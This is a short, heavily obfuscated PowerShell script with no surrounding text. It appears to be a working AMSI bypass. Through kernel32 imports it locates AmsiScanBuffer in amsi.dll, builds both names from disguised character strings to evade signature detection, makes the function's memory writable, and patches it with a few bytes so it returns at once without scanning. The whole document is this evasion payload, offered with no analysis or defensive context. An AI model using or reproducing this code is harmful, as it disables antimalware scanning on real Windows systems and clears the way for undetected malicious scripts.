$qfn0edT_6uYY6PL5Cgr = @"
using System;
using System.Runtime.InteropServices;
public class qfn0edT_6uYY6PL5Cgr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr bOk3g2i, string ndTfZ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fyGP6rUzbEl2S3g8hYv, UIntPtr Guc489MTmYG10NZRfRAX, uint XBZKZQyBFqQXkLddK, out uint jPZk3B68ca2F);
}
"@

Add-Type $qfn0edT_6uYY6PL5Cgr

$jFNc7EPMeV9iVu_ = [qfn0edT_6uYY6PL5Cgr]::LoadLibrary("$(('à'+'m'+'s'+'î'+'.'+'d'+'l'+'l').noRmALIZe([CHar](70)+[CHaR](100+11)+[cHAR](114*47/47)+[chaR]([byTE]0x6d)+[char]([BYte]0x44)) -replace [CHAR](79+13)+[chaR](112+14-14)+[cHAR]([ByTE]0x7b)+[ChAR]([bYte]0x4d)+[ChaR](110+10-10)+[CHaR](125))")
$YVxn = [qfn0edT_6uYY6PL5Cgr]::GetProcAddress($jFNc7EPMeV9iVu_, "$(('Äms'+'íSc'+'änB'+'úff'+'èr').nORMalIZe([CHAr]([ByTe]0x46)+[char](111)+[CHar]([BYTe]0x72)+[ChaR](109)+[ChaR]([bYte]0x44)) -replace [chaR]([ByTe]0x5c)+[cHAr](112)+[cHAR](123*47/47)+[char]([byte]0x4d)+[chAr]([BYTE]0x6e)+[CHaR](125))")
$p = 0
[qfn0edT_6uYY6PL5Cgr]::VirtualProtect($YVxn, [uint32]5, 0x40, [ref]$p)
$QyC8Zn7psYFS = "0xB8"
$K6OoGX2bSNk = "0x57"
$_xVmLqqOM6JQmp = "0x00"
$keyFKA4mYtU1 = "0x07"
$ec81 = "0x80"
$bH9YsvDc = "0xC3"
$zEhJ3bgpNZZTkLfqjnpO = [Byte[]] ($QyC8Zn7psYFS,$K6OoGX2bSNk,$_xVmLqqOM6JQmp,$keyFKA4mYtU1,+$ec81,+$bH9YsvDc)
[System.Runtime.InteropServices.Marshal]::Copy($zEhJ3bgpNZZTkLfqjnpO, 0, $YVxn, 6)